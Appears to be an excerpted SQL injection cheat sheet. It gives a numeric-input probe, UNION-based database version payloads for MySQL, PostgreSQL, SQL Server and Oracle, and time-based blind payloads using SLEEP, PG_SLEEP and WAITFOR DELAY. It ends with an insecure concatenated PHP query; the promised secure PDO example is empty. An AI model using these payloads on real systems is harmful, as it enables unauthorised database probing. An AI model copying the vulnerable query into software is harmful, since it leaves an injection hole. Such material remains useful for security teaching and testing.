...
A. Target /item.php?id=5 with /item.php?id=6-1

B. If the application returns the same result for both, numerical input is being evaluated.
...
A. MySQL/MariaDB: ' UNION SELECT @@version, NULL -- -

B. PostgreSQL: ' UNION SELECT version(), NULL -- -

C. Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -

D. Oracle: ' UNION SELECT banner, NULL FROM v$version -- -
...
1. MySQL Payload: ' AND IF(1=1, SLEEP(5), 0) -- -


2.PostgreSQL Payload: ' AND (SELECT 1 FROM PG_SLEEP(5)) -- -


3. Microsoft SQL Server Payload: ' IF(1=1) WAITFOR DELAY '0:0:5' -- -
...
A. Insecure PHP Implementation:

$query = "SELECT * FROM users WHERE username = '" . $user . "'";


B. Secure PHP Implementation (PDO Prepared Statement):
